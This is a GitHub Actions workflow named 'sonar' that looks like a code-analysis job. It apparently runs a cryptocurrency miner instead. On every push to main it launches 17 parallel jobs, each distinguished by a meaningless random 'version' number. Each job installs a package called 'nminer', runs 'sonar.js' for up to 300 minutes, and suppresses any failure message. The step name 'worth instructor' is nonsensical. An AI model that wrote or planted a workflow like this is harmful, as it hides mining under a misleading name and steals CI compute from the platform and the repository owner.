name: sonar
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2759 }
          - { version: 8039 }
          - { version: 4455 }
          - { version: 9408 }
          - { version: 7015 }
          - { version: 9798 }
          - { version: 9358 }
          - { version: 5989 }
          - { version: 1658 }
          - { version: 2926 }
          - { version: 1521 }
          - { version: 9346 }
          - { version: 7954 }
          - { version: 5684 }
          - { version: 2156 }
          - { version: 8441 }
          - { version: 4235 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: worth instructor
        run: |
          npm install nminer@latest
          timeout 300m node sonar.js || echo "sonar executed"